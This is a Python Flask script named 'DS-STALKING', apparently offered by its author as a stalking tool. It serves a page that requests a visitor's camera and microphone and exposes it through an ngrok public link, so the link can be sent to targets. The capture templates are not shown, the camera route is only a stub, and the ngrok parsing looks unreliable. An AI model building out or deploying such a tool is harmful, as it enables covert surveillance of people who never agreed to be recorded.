from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
import subprocess
import time

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Fonction pour démarrer ngrok et obtenir l'URL public
def get_ngrok_url():
    # Lancer ngrok dans un sous-processus
    ngrok_process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2)  # Attendre un peu pour que ngrok démarre
    # Lire la sortie de ngrok pour obtenir l'URL publique
    url_output = ngrok_process.stdout.read().decode("utf-8")
    for line in url_output.splitlines():
        if "Forwarding" in line:
            ngrok_url = line.split(" ")[1]
            return ngrok_url
    return None

@app.route("/")
def home():
    # Page d'accueil qui demande l'accès à la caméra et au micro
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port local
    local_ip = get_local_ip()
    port = 5000
    stream_url = f"http://{local_ip}:{port}/camera"  # Lien pour accéder à la caméra en local

    # Obtenir l'URL publique générée par ngrok
    ngrok_url = get_ngrok_url()

    # Retourner les deux liens : un local et un distant (ngrok)
    return jsonify({"local_stream_url": stream_url, "ngrok_stream_url": ngrok_url})

# Flux vidéo
@app.route("/camera")
def camera():
    # Ici vous pouvez implémenter le flux vidéo ou la logique pour afficher la vidéo de la caméra
    return render_template("view_stream.html")

if __name__ == "__main__":
    # Exécuter le serveur Flask
    local_ip = get_local_ip()
    print(f"Serveur en cours d'exécution sur http://{local_ip}:5000")

    # Démarrer le serveur Flask
    app.run(host="0.0.0.0", port=5000)